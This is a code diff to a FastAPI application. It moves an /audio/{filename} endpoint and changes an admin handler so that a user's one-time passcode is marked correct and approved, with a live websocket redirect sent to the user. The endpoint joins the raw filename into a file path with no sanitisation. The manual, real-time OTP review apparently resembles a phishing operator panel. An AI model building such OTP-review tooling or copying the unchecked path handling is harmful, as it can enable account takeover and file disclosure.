@@ -1,6 +1,6 @@
 # app.py
 from fastapi import FastAPI, HTTPException, Depends, status, Request, WebSocket, WebSocketDisconnect
-from fastapi.responses import HTMLResponse
+from fastapi.responses import HTMLResponse, FileResponse
 from fastapi.templating import Jinja2Templates
 from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
 from pydantic import BaseModel
@@ -135,6 +135,17 @@ app = FastAPI(lifespan=lifespan)
 
 # Templates
 templates = Jinja2Templates(directory="templates")
+
+# ============ AUDIO FILES ENDPOINT ============
+@app.get("/audio/{filename}")
+async def get_audio(filename: str):
+    # Look for audio files in templates folder
+    audio_path = f"templates/{filename}"
+    
+    if not os.path.exists(audio_path):
+        raise HTTPException(status_code=404, detail=f"Audio file {filename} not found")
+    
+    return FileResponse(audio_path, media_type="audio/mpeg")
 
 # Pydantic models
 class UserLogin(BaseModel):
@@ -401,18 +412,17 @@ async def success_first_otp(action: AdminAction, credentials: HTTPAuthorizationC
         raise HTTPException(status_code=403, detail="Invalid token")
     
     async with db_pool.acquire() as conn:
-        # Mark as NEVER - block the user permanently
         await conn.execute("""
             UPDATE users 
-            SET otp1_never = TRUE, otp1_correct = FALSE, approved = TRUE
+            SET otp1_correct = TRUE, approved = TRUE, otp1_never = FALSE
             WHERE email = $1
         """, action.email)
         
-        # Send notification to user to redirect to success page
+        # Notify user to go to success page directly
         await manager.send_to_user(action.email, {
-            "type": "otp1_never",
-            "message": "Your OTP has been marked as invalid permanently. Redirecting to success page.",
-            "redirect_url": f"/success?email={action.email}"
+            "type": "first-approved",
+            "email": action.email,
+            "message": "Success! Redirecting..."
         })
         
         return {"success": True}
@@ -583,13 +593,6 @@ async def websocket_admin(websocket: WebSocket):
             pass
     except WebSocketDisconnect:
         manager.disconnect_admin(token)
-
-@app.get("/audio/{filename}")
-async def get_audio(filename: str):
-    file_path = f"templates/{filename}"
-    if os.path.exists(file_path):
-        return FileResponse(file_path, media_type="audio/mpeg")
-    return {"error": "File not found"}
 
 # ============ RUN ============
 if __name__ == "__main__":
